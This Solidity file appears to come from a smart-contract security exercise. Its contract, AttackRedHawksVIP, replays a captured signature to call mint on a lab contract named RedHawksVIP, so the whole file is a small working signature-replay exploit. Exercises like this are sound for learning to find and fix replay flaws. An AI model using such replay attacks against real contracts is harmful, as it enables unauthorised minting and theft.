// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;
import {RedHawksVIP} from "../replay-attack-3/RedHawksVIP.sol";

contract AttackRedHawksVIP {
    RedHawksVIP private immutable redhawksvip;

    constructor(address _contractAddress) {
        redhawksvip = RedHawksVIP(_contractAddress);
    }

    function attack(bytes memory signature) external {
        redhawksvip.mint(2, "sagetony", signature);
    }
}
